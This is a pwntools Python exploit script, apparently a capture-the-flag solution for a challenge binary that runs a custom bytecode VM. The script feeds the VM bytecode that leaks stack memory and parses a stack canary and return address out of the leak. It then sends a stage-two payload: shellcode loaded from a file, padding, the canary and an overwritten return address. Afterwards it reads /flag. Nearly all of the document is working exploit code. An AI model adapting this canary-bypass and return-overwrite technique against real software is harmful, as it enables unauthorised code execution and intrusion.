#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

'''
mov = 0x02
add = 0x01
stk = 0x04
stm = 0x20
ldm = 0x80
cmp = 0x10
jmp = 0x08
sys = 0x40

regs:
    0x404 rsp = 0x01
    0x405 rip = 0x08
    0x400   a = 0x02
    0x401   b = 0x40
    0x402   c = 0x20
    0x403   d = 0x10
    0x406   f = 0x04
'''

#[value][register][op]

def load_shellcode():
    with open("asm/chmodtext", "rb") as f:
        shellcode = bytes(f.read())
        f.close()
        return shellcode

def _compile():
    shellcode = ""
    shellcode += "010202" # mov a = 01 (rax)
    shellcode += "ff4002" # mov b = ff (rsi)
    shellcode += "302002" # mov c = 30 (rdi)
    shellcode += "020840" # syscall write (stdout)
    shellcode += "000202" # mov a = 00 (rax)
    shellcode += "d04002" # mov b = d0 (rsi)
    shellcode += "ff2002" # mov c = ff (rdi)
    shellcode += "022040" # syscall read (stdin)
    print("size:", str(int(len(shellcode))))
    return bytes.fromhex(shellcode.rstrip())
   
def stage2(canary,retadr):
    shellcode = load_shellcode()
    shellcode += bytes.fromhex("41" * 32)
    shellcode += p64(int(canary, 16))
    shellcode += bytes.fromhex("00" * 8)
    shellcode += pack(int(retadr, 16) - 0x138)
    return shellcode

def runner():
    p = process()
    code = _compile()
    p.recv()
    p.send(code)
    p.recv()
    p.recvuntil(b"write\n")
    
    values = p.recvline().split(b"[s]")[0]
    values = int.from_bytes(values, byteorder="little")
    print(hex(values))
    retadr = hex(values)[:14]
    canary = "0x" + (hex(values)[:-18][-16:])
    print(f"[r] {retadr}")
    print(f"[c] {canary}")
    p.send(stage2(canary,retadr))
    
    print(p.recvuntil("is now").decode())
    p.close()
    p.kill()

if __name__ == '__main__':
    runner()
    try:
        with open("/flag", "r") as f:
            print(f.read())
            f.close()
    except:
        print("[!] Failed :(")
